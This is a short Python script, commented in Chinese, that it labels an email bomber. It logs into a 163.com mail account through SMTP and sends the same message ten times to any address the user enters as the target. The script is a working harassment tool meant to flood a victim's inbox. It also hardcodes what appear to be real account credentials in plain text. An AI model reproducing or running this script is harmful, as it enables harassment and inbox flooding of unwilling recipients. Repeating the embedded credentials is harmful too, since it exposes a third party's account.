'''
python实现邮箱轰炸
smtp协议：登录，传输
email协议：正文、标题
'''
import smtplib
from email.mime.text import MIMEText

sender = '18599141728@163.com'  # 账号
pwd = 'JRVWGBLFCBWLLGQC'  # 密码

# 邮件：发送人、接收人、主题、内容
body = '我是大帅逼'                   # 内容
msg = MIMEText(body, 'html')         # 转换成浏览器认识的
msg['subject'] = '123'               # 主题
msg['from'] = sender                 # 发送人
a = input('请输入您要轰炸的邮箱账号：')
msg['to'] = a                        # 接收人

s = smtplib.SMTP_SSL('smtp.163.com',465)  # 建立连接  |网易邮箱的端口号是465
s.login(sender, pwd)  # 身份认证
for i in range(10):
    s.sendmail(sender, a, msg.as_string())  # 发送邮件
print('电子邮件发送成功')


'''
问题一：smtplib.SMTPAuthenticationError: (550, b'User has no permission')
密码不是登录密码，而是授权密码
'''